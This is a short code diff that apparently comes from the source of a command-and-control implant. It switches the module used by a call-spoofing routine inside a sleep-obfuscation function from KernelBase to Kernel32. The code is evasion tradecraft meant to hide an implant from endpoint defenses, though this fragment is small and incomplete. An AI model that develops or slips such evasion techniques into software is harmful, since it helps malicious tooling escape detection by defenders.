@@ -726,8 +726,8 @@ VOID SleepObf(
         /* default */
         DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
             SpoofFunc(
-                Instance.Modules.KernelBase,
-                IMAGE_SIZE( Instance.Modules.KernelBase ),
+                Instance.Modules.Kernel32,
+                IMAGE_SIZE( Instance.Modules.Kernel32 ),
                 Instance.Win32.WaitForSingleObjectEx,
                 NtCurrentProcess(),
                 C_PTR( TimeOut ),
